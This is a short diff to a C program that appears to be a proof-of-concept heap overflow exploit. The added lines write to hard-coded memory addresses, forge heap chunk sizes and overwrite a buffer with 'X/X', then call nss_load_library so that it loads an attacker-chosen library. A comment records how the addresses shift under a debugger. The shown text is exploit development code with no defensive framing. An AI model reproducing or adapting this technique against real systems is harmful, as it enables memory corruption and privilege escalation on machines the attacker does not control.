@@ -102,11 +102,18 @@ int main(int argc, char **argv)
 		}
 		*to++ = ' ';
 	}
+	// TODO: buffer overflow needs fix the following addresses
+	int *first_size = (void *)0x804d1bc;
+	int *second_size = (void *)0x804d1ec;
+	char *name = (void *)0x804d1f0; // this is 0x804d1e0 when started via GDB
+	*first_size = 0x00000031;
+	*second_size = 0x00000011;
+	strcpy(name, "X/X");
 
 	// call nss_load_libary behind heap buffer overflow
 	nss_load_library(ni);
 
-	if (dlerror() != 0) 
+	if (dlerror() != 0)
 		exit(EXIT_FAILURE);
 	exit(EXIT_SUCCESS);
 }
